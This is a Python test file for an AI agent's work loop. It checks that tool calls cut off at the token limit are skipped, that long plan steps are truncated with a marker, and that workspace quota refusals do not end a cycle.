    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("workspace_write", {"path": "whole.md", "mode": "create", "content": "whole"}),
                ("workspace_write", {"path": "cut.md", "mode": "create"}),  # the cut took its content
                stop="max_tokens",
            ),
            text("Done."),
            text("Reflection without tools."),
        ],
    )
    assert agent.run_cycle("schedule").status == "completed"
    check_conversations(transport.sent)
    results = transport.sent[2]["messages"][-1]["content"]
    assert not results[0].get("is_error") and results[1]["is_error"]
    assert (
        "cut off" in results[1]["content"] and "at most 2,500 characters (create, then append" in results[1]["content"]
    )
    workspace, _ = agent.roots()
    assert workspace.exists("whole.md") and not workspace.exists("cut.md")
    assert [r["status"] for r in rows(agent, "SELECT status FROM tool_calls ORDER BY id")] == ["ok", "skipped"]


def test_only_the_last_block_of_a_cut_off_reply_can_be_incomplete() -> None:
    first, second = ({"type": "tool_use", "id": f"toolu_{n}", "name": "workspace_list", "input": {}} for n in (1, 2))
    words = {"type": "text", "text": "and then"}
    assert loop._whole_calls([first, second], [first, second]) == [first]
    assert loop._whole_calls([first, second, words], [first, second]) == [first, second]
    assert loop._whole_calls([words], []) == []


def test_a_cut_off_reflection_keeps_the_calls_it_finished(data_dir: Path) -> None:
    agent, _ = make_agent(
        data_dir,
        [
            plan(),
            text("Done."),
            tools(
                ("write_journal", {"summary": "Made the spec", "entry": "It went well."}),
                ("memory_update", {"file": "lessons", "mode": "append"}),  # the cut took its content
                stop="max_tokens",
            ),
        ],
    )
    assert agent.run_cycle("schedule").status == "completed"
    assert rows(agent, "SELECT author, summary FROM journal") == [{"author": "agent", "summary": "Made the spec"}]
    assert rows(agent, "SELECT tool, phase, status FROM tool_calls ORDER BY id") == [
        {"tool": "write_journal", "phase": "reflect", "status": "ok"},
        {"tool": "memory_update", "phase": "reflect", "status": "skipped"},
    ]


def test_a_long_plan_step_is_cut_and_says_so(data_dir: Path) -> None:
    most = loop.STEP_CHARS
    agent, transport = make_agent(data_dir, [plan(steps=["a" * most, "b" * 250]), text("Done."), text("Reflected.")])
    agent.run_cycle("schedule")
    steps = json.loads(rows(agent, "SELECT plan FROM cycles")[0]["plan"])["steps"]
    assert steps == ["a" * most, "b" * (most - 1) + "…"]
    assert f"\n1. {'a' * most}\n2. {'b' * (most - 1)}…\n" in transport.sent[1]["messages"][0]["content"][0]["text"]
    assert f"(each <= {most} characters)" in prompts.PLANNER_RULES  # the planner is told the limit


def test_a_full_workspace_is_no_strike(data_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # 0.12.0: quota refusals counted as strikes, so a full workspace ended the work after three writes.
    roots = Agent.roots

    def small(agent: Agent) -> tuple[Jail, Jail]:
        workspace, memory = roots(agent)
        return Jail(workspace.root, Limits(max_files=1)), memory

    monkeypatch.setattr(Agent, "roots", small)
    writes = [tools(("workspace_write", {"path": f"f{n}.md", "mode": "overwrite", "content": "x"})) for n in range(5)]
    bad = tools(("workspace_write", {"path": "../x.md", "mode": "overwrite", "content": "x"}))
    agent, _ = make_agent(data_dir, [plan(), *writes, bad, text("done"), text("reflected")])
    assert agent.run_cycle("schedule").status == "completed"
    results = rows(agent, "SELECT status, result FROM tool_calls WHERE tool = 'workspace_write' ORDER BY id")
    assert [r["status"] for r in results] == ["ok", "error", "error", "error", "error", "error"]
    assert "the workspace holds at most 1 files; delete some first" in results[1]["result"]
    assert rows(agent, "SELECT act_end_reason FROM cycles")[0]["act_end_reason"] == "done"  # four refusals, no end
